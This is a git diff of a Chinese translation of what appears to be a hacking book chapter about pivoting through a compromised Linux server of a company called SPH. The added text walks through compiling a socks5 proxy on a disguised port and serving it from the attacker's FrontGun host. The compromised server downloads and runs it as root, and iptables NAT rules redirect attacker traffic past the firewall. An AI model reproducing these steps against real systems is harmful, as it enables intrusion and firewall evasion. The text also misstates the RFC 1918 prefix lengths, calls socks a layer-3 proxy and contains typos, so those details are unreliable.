@@ -152,9 +152,52 @@ uid=0(root) gid=0(root) groups=0(root)
 设备在互联网上可以通过 IP 地址被访问。IPv4 由四个字节组成，通常用 X.X.X.X 表示， X 值介于 0 到 255。
 有些 IP 地址被保留用于本地网络，不能用于互联网（RFC 1918）：
 
-> 127.0.0.1 表示本机
-172.16.0.0/16 (从 172.16.0.0 到 172.16.31.255)
-192.168.0.0/24 （从 192.168.0.0 到 192.168.255.255）
-10.0.0.0/8 （从 10.0.0.0 到 10.255.255.255）
+    127.0.0.1 表示本机
+    172.16.0.0/16 (从 172.16.0.0 到 172.16.31.255)
+    192.168.0.0/24 （从 192.168.0.0 到 192.168.255.255）
+    10.0.0.0/8 （从 10.0.0.0 到 10.255.255.255）
 
+如果路由器在公网接口看到了以上地址，将会直接丢弃这些数据包。
 {% endhint %}
+
+蓝色区域的服务器都位 192.168.1.0/24 网段。如果我们告诉 FrontGun 服务器向 192.168.1.56 发送一个数据包，互联网路由器显然会根据 RFC 1918 直接予以丢弃。
+
+解决该问题的小技巧就是，告诉 Linux 服务器，将其公网IP接收到的所有来自于我们的 IP 数据包转发到 192.168.1.0/24 网段的其他机器。 事实上，这台 Linux 服务器就是一个工作在 TCP/IP 协议栈第三层的代理，也就是我们常说的 socks 代理。
+
+![虚拟网络示意图](./Chap3/3.3-1.png)
+
+### 3.3.1 Socks 代理
+
+通过下面的链接，可以获得一个简单的 socks 代理实现代码。
+```shell
+frontGun$ wget https://raw.githubusercontent.com/mfontanini/Programs- Scripts/master/socks5/socks5.cpp
+```
+在编译之前，先将监听端口从 5555 改为一个不太明显的端口（比如 1521 端口），并对隧道连接设置账号密码。
+
+![修改代码中的配置](./Chap3/3.3-2.png)
+
+在 FrontGun 服务器上编译该文件，然后启动一个轻量级的 HTTP 服务，方便一会儿从 SPH 公司的 linux 服务器上下载该程序。
+
+```shell
+FrontGun$ g++ -o socks5 socks5.cpp -lpthread
+FrontGun$ python -m SimpleHTTPServer 80
+```
+在 SPH 公司的服务器上，下载该程序，赋予可执行权限，然后运行：
+```
+root@CAREER:$ wget http://FRONTGUN_IP/socks5
+root@CAREER:$ chmox +x socks5 && ./socks5
+```
+在实现的服务器上启动了 1521 端口。现在我们建立了一条隧道，正在等待连接。然而，这台 Linux 服务器看起来位于防火墙后面，禁止了对 1521 端口的入站连接。
+```
+FrontGun$ nc career.sph-assets.com 1521
+(Connection timeout)
+```
+要想解决这个问题，我们在拿下的 Linux 服务器上创建两条本地规则，将所有来自我们 IP 的数据包都路由到 1521 端口：
+```shell
+root@CAREER# iptables -t nat -A PREROUTING -s
+<IP_FrontGun> -p tcp -i eth1 -–dport 80 -j DNAT -–to- dest webserver02:1521
+root@CAREER# iptables -t nat -A POSTROUTING -d webserver02 -o eth1 -j MASQUERADE
+```
+SPH 公司的这台 linux 服务器每次收到我们的 FrontGun 服务器 IP 发来的对80端口请求的数据包时，都会将其转发到 1521 端口。 Socks 代理将会解析我们的请求，然后根据我们的要求访问指定的内部服务器……干得漂亮！
+
+
